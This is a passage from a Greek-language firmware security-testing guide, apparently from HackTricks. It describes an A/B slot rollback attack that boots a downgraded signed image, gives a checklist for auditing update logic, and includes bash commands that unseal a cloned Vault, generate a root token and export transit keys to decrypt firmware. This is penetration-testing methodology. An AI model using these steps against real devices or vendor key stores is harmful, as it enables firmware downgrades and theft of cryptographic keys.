Αυτό δημιουργεί ένα **validate-one-image / boot-another-image** primitive σε dual-slot systems. Αν ο attacker μπορεί να κάνει τον updater να ορίσει το slot B ως επόμενο boot target χρησιμοποιώντας ένα current signed image και μπορεί αργότερα να κάνει overwrite το slot B πριν από το reboot, ο bootloader μπορεί και πάλι να εκκινήσει το downgraded image, επειδή εμπιστεύεται μόνο τα slot metadata που έχουν ήδη γίνει commit.

Συνηθισμένο abuse pattern:

1. Κάντε upload ένα **current signed** firmware στο passive slot και εκτελέστε την κανονική validation/switch routine, ώστε το layout να ορίσει αυτό το slot ως επόμενο active.
2. **Μην κάνετε reboot ακόμη**. Εισέλθετε ξανά στη slot-preparation/erase routine μέσα στην ίδια session.
3. Κάντε abuse σε stale boot-state ή stale slot-selection logic, ώστε ο updater να κάνει erase το **ίδιο physical slot** που μόλις προήχθη.
4. Γράψτε ένα **παλαιότερο αλλά ακόμη signed** firmware σε αυτό το slot.
5. Παραλείψτε τη validation routine που επιβάλλει το ratchet και κάντε απευθείας reboot.
6. Ο bootloader επιλέγει το promoted slot, επαληθεύει μόνο το signature/integrity και εκκινεί το old image.

Πράγματα που πρέπει να αναζητήσετε κατά το reversing A/B update implementations:

- Slot selection που προκύπτει από **boot-time flags** και δεν ανανεώνεται μετά από επιτυχημένο switch.
- Μια routine τύπου `prepare_passive_slot()` που κάνει erase σε ένα slot με βάση stale state αντί για το **current committed layout**.
- Μια function τύπου `part_write_layout()` που αυξάνει μόνο έναν **generation counter** / active flag και δεν αποθηκεύει το validated image hash.
- Ratchet checks που υλοποιούνται σε userspace ή updater code, αλλά **όχι** σε ROM / bootloader / secure boot stages.
- Erase ή recovery routines που αφήνουν το slot σημειωμένο ως bootable ακόμη και αφού το περιεχόμενό του αφαιρεθεί και γραφτεί ξανά.

### Checklist για την αξιολόγηση του Update Logic

* Προστατεύονται επαρκώς το transport/authentication του *update endpoint* (TLS + authentication);
* Συγκρίνει η συσκευή **version numbers** ή έναν **monotonic anti-rollback counter** πριν από το flashing;
* Επαληθεύεται το image μέσα σε secure boot chain (π.χ. signatures checked από ROM code);
* Επιβάλλει ο **bootloader το ίδιο ratchet** με τον updater, αντί να ελέγχει μόνο signature/CRC;
* Είναι τα slot activation metadata **συνδεδεμένα με το validated firmware digest/version**, ή μπορεί να τροποποιηθεί ένα slot μετά το promotion;
* Μετά από επιτυχημένο slot switch, υποχρεώνεται η συσκευή να κάνει reboot ή παραμένουν προσβάσιμες μεταγενέστερες update/erase routines μέσα στην ίδια session;
* Εκτελεί ο userland code πρόσθετους sanity checks (π.χ. allowed partition map, model number);
* Επαναχρησιμοποιούν τα *partial* ή *backup* update flows την ίδια validation logic;

> 💡  Αν λείπει οποιοδήποτε από τα παραπάνω, η πλατφόρμα είναι πιθανότατα ευάλωτη σε rollback attacks.

## Vulnerable firmware για practice

Για practice στην ανακάλυψη vulnerabilities σε firmware, χρησιμοποιήστε τα παρακάτω vulnerable firmware projects ως starting point.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Ανάκτηση firmware decryption keys από embedded KMS/Vault state

Όταν ένα update image συνδυάζει μικρά plaintext metadata με ένα μεγάλο high-entropy blob, κάντε container triage πριν δοκιμάσετε brute-forcing:<sup>[[1]](#references)</sup>

- Κάντε dump τα headers, τα offsets και τα line boundaries με `hexdump`, `xxd`, `strings -tx`, `base64 -d` και `binwalk -E`.
- Το `Salted__` συνήθως σημαίνει format OpenSSL `enc`: τα επόμενα 8 bytes είναι το salt και τα υπόλοιπα bytes είναι ciphertext.
- Ένα Base64 field που αποκωδικοποιείται σε ακριβώς `256` bytes αποτελεί ισχυρή ένδειξη ότι πρόκειται για RSA-2048 ciphertext που τυλίγει ένα random firmware password/session key.
- Detached PGP material στο ίδιο file συχνά προστατεύει μόνο την authenticity· μην υποθέσετε ότι αποτελεί τον confidentiality mechanism.

Αν το static key hunting (`grep`, `strings`, PEM/PGP searches) αποτύχει, κάντε reverse το **operational decrypt path** αντί να αναζητάτε μόνο private keys:

- Κάντε decompile το updater / management binary και κάντε trace ποιος διαβάζει το encrypted blob, ποιο helper/API το κάνει unwrap και ποιο logical key name ζητά.
- Κάντε search στο extracted root filesystem για KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), καθώς και για unit files και init scripts.
- Αντιμετωπίστε plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens ή local KMS auto-unseal scripts ως ισοδύναμα με private-key material.

Αν το appliance περιλαμβάνει το αρχικό Vault binary και storage backend, η αναπαραγωγή αυτού του environment είναι συνήθως ευκολότερη από την επανυλοποίηση των Vault internals:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Με root στο cloned KMS:

- Κάντε τα transit keys exportable μόνο μέσα στο isolated clone: `vault write transit/keys/<name>/config exportable=true`
- Κάντε export το unwrap key: `vault read transit/export/encryption-key/<name>`
- Δοκιμάστε το ανακτημένο RSA key με το ακριβές ζεύγος padding/hash που χρησιμοποιεί το KMS. Μια αποτυχημένη αποκρυπτογράφηση PKCS#1 v1.5 και μια αποτυχημένη προεπιλεγμένη αποκρυπτογράφηση OAEP **δεν** αποδεικνύουν ότι το key είναι λανθασμένο· πολλά Vault-backed flows χρησιμοποιούν OAEP με SHA-256, ενώ οι κοινές libraries έχουν προεπιλεγμένο το SHA-1.
- Αν το payload ξεκινά με `Salted__`, αναπαραγάγετε ακριβώς το vendor's OpenSSL KDF (`EVP_BytesToKey`, συχνά MD5 σε legacy appliances) πριν επιχειρήσετε AES-CBC decryption.

Αυτό μετατρέπει το «encrypted firmware» σε ένα πιο γενικό πρόβλημα: **ανακτήστε τα operational keys στην πλευρά του appliance και, στη συνέχεια, αναπαραγάγετε offline ακριβώς τις παραμέτρους unwrap + KDF**.

## Εκπαίδευση και Πιστοποίηση

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Αναφορές

- [1] [Cracking Firmware with Claude: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
